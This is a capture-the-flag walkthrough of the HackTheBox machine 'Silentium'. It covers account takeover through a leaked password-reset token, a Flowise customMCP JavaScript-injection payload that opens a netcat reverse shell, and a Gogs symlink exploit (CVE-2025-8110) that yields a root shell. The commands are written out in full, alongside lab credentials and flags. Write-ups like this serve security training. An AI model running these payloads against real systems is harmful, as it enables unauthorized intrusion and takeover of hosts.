---
label: "Silentium"
icon: shield
---

# Silentium

!!!secondary Machine Info
**Platform:** HackTheBox · **OS:** Linux · **Difficulty:** Hard · **Status:** Retired
!!!

---

## 🔍 Reconnaissance

### Nmap

Initial scan reveals two open ports:

```
22/tcp  open  ssh
80/tcp  open  http
```

### Virtual Host Enumeration

Adding `silentium.htb` to `/etc/hosts` gives access to the main web application — a page listing employee names, including **ben**.

Running `subfinder` uncovers a second subdomain:

```
staging.silentium.htb
```

Add it to `/etc/hosts` as well. This subdomain hosts a **login page**.

---

## 🌐 Web — Foothold via Flowise RCE

### Password Reset Enumeration

The password reset endpoint leaks whether a username exists. Testing with `ben@silentium.htb` confirms the account:

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

The response includes a **`tempToken`**.

### Password Reset

Use the token to set a new password:

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "<TOKEN_HERE>",
      "password": "MyPassword123"
    }
  }'
```

### API Key Recovery

Authenticate on the staging platform and navigate the UI menus to retrieve ben's **API key**:

```
n3vQgeiafsz7jNi24HreclgpAWqIRTYZhizvAVUQwjY
```

### Flowise RCE

The platform is running **Flowise**. The `customMCP` endpoint is vulnerable to remote code execution via a JavaScript injection in the `mcpServerConfig` parameter.

Set up a listener:

```bash
nc -lvp 4444
```

Trigger the reverse shell:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer n3vQgeiafsz7jNi24HreclgpAWqIRTYZhizvAVUQwjY" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 4444 >/tmp/f\");return 1;})()} )"
    }
  }'
```

Shell received.

---

## 🐚 User Flag

Enumerate environment variables after getting the shell:

```bash
env
```

Credentials found: `r04D!!_R4ge` — ben's SSH password.

```bash
ssh ben@10.129.31.50
```

**User flag:** `1ad3e56ca64c3dc7542fb54e9f397cf5`

---

## ⬆️ Privilege Escalation — CVE-2025-8110 (Gogs Symlink Attack)

### Internal Service Discovery

Checking locally bound ports:

```bash
ss -tlnp
```

**Gogs** is running on `127.0.0.1:3001`.

### Port Forwarding

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.31.50
```

Access Gogs at `http://localhost:3001`.

### Account Creation

Register a test account at `http://localhost:3001/user/sign_up`:

```
Username: test
Password: test123
```

### Exploiting CVE-2025-8110

The vulnerability is a **symlink attack** via the Gogs repository contents API — it allows reading arbitrary files as the user running Gogs (root in this case).

Use the PoC: [zAbuQasem/gogs-CVE-2025-8110](https://github.com/zAbuQasem/gogs-CVE-2025-8110/blob/main/CVE-2025-8110.py)

Before running, patch the script:

- **Remove line 213**
- **Update lines 209–210** with your credentials (`test` / `test123`)
  Set up a listener:

```bash
nc -lvp 5555
```

Run the exploit:

```bash
python gogs1.py -u http://localhost:3001 -lh 10.10.16.6 -lp 5555
```

!!!warning Git identity error
If the script fails with a git identity error, run:

```bash
git config --global user.email "test@test.com"
git config --global user.name "test"
```

Then re-run the exploit.
!!!

Root shell received on the listener.

**Root flag:** `97fd69078ed8b6daf992cecd42e40bac`

---

## 📌 Key Takeaways

| Phase            | Technique                                            |
| ---------------- | ---------------------------------------------------- |
| Recon            | Subdomain enumeration via `subfinder`                |
| Initial access   | Password reset token leak → account takeover         |
| Foothold         | Flowise RCE via `customMCP` JavaScript injection     |
| Lateral movement | Credentials in environment variables                 |
| Privesc          | CVE-2025-8110 — Gogs symlink attack via contents API |

---

## 🔗 References

- [CVE-2025-8110 PoC — zAbuQasem](https://github.com/zAbuQasem/gogs-CVE-2025-8110)
- [Flowise documentation](https://docs.flowiseai.com)
